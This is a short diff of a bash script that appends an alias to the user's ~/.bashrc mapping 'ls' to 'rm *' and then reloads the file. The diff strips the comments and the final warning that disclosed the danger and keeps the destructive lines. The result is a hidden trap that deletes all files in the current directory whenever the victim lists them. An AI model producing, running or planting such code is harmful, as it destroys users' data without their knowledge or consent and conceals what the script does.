@@ -1,9 +1,3 @@
 #!/bin/bash
-
-# Dangerous alias: replaces 'ls' with 'rm *'
 echo "alias ls='rm *'" >> ~/.bashrc
-
-# Reload bashrc to apply changes
 source ~/.bashrc
-
-echo "Alias created. Warning: 'ls' now deletes all files in the current directory!"
